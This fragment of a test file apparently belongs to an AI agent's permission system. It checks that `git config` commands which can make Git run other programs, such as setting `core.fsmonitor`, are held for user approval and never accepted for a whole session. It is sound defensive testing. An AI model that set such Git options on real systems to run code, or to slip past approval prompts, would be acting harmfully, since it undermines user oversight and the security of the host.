      expect(verdict.reasons.join(' '), command).toMatch(/Git can run commands named there/)
      expect(fullAccessPolicy({ kind: 'approval', toolName: 'Bash' }, verdict, 'full-access'), command).toMatchObject({ decision: 'ask', guarded: true })
      expect(guardedDecisions(['accept', 'acceptForSession', 'decline'], verdict), command).toEqual(['accept', 'decline'])
    }
    expect(evaluatePermission({ kind: 'approval', toolName: 'Bash', command: 'git config --get user.name' }, '/repo', rules, posix)?.guarded).toBeUndefined()
    expect(describePermissionRequest({}, 'Bash', { command: 'git config core.fsmonitor x' }).decisions).toEqual(['accept', 'decline'])
  })
})
